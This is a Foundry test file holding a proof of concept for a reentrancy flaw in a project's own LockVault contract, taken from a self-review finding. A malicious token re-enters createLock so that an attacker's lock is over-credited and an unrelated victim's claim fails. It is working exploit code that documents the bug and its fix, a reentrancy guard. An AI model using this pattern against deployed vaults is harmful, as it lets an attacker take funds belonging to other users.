// Proof of concept for the one High finding from the self-review:
// `LockVault.createLock` / `editLock` update state **after** calling the token,
// so a token with a transfer callback can re-enter and over-credit a lock.
// This test demonstrates the over-credit and the resulting shortfall for an
// unrelated lock of the same token.
//
// It is a PoC, not a regression test: the deployed contracts cannot be patched.
// The fix for a future deployment is a reentrancy guard (or a pending-lock id
// written before the transfer). See contracts/SELF-REVIEW.md.
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../../contracts/LockVault.sol";

/// Minimal ERC-20 whose transferFrom re-enters createLock once.
contract ReentrantToken {
    string public name = "Reentrant";
    string public symbol = "RE";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    LockVault public vault;
    bool public armed;
    bool private inHook;
    uint256 public reenterAmount;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function arm(LockVault v, uint256 amount) external {
        vault = v;
        reenterAmount = amount;
        armed = true;
        allowance[address(this)][address(v)] = type(uint256).max;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;

        if (armed && !inHook) {
            armed = false;
            inHook = true;
            vault.createLock(LockVault.CreateParams({
                token: address(this),
                amount: reenterAmount,
                beneficiary: address(this),
                agent: address(0),
                startTime: 1,
                cliffTime: 1,
                endTime: 1,
                initialUnlockBps: 0,
                steps: 0,
                revocable: false,
                transferable: true,
                label: bytes32("inner")
            }));
            inHook = false;
        }
        return true;
    }
}

contract ReentrancyPoC is Test {
    LockVault vault;
    ReentrantToken token;

    function setUp() public {
        vault = new LockVault();
        token = new ReentrantToken();
        token.mint(address(this), 1_000e18);
        token.mint(address(token), 1_000e18);
        token.approve(address(vault), type(uint256).max);
    }

    function _create(address beneficiary, uint256 amount) internal returns (uint256 id) {
        vault.createLock(LockVault.CreateParams({
            token: address(token),
            amount: amount,
            beneficiary: beneficiary,
            agent: address(0),
            startTime: 1,
            cliffTime: 1,
            endTime: 1,
            initialUnlockBps: 0,
            steps: 0,
            revocable: false,
            transferable: true,
            label: bytes32("poc")
        }));
        // The re-entrant call may have consumed an id before ours.
        id = vault.nextLockId() - 1;
    }

    function test_reentrant_token_overcredits_and_strands_another_lock() public {
        token.arm(vault, 50e18);

        // Outer lock asks for 100; the token re-enters and creates a 50 lock.
        // The outer balance delta includes the inner 50, so it credits 150.
        uint256 outerId = _create(address(this), 100e18);
        uint256 innerId = outerId - 1;

        LockVault.Lock memory outer = vault.getLock(outerId);
        LockVault.Lock memory inner = vault.getLock(innerId);
        assertEq(outer.amount, 150e18, "outer was over-credited");
        assertEq(inner.amount, 50e18, "inner lock exists");

        // An unrelated user locks 100 of the same token.
        address victim = address(0xCAFE);
        uint256 victimId = _create(victim, 100e18);

        // Total credited (150 + 50 + 100 = 300) exceeds the 250 actually held.
        assertEq(token.balanceOf(address(vault)), 250e18, "vault holds 250");
        assertGt(uint256(outer.amount) + inner.amount + vault.getLock(victimId).amount, token.balanceOf(address(vault)));

        vm.warp(2);
        vault.claim(outerId);   // attacker takes 150
        vault.claim(innerId);   // attacker takes another 50
        assertEq(token.balanceOf(address(vault)), 50e18, "50 left");

        vm.prank(victim);
        vm.expectRevert();      // victim's 100 can no longer be paid
        vault.claim(victimId);
    }
}
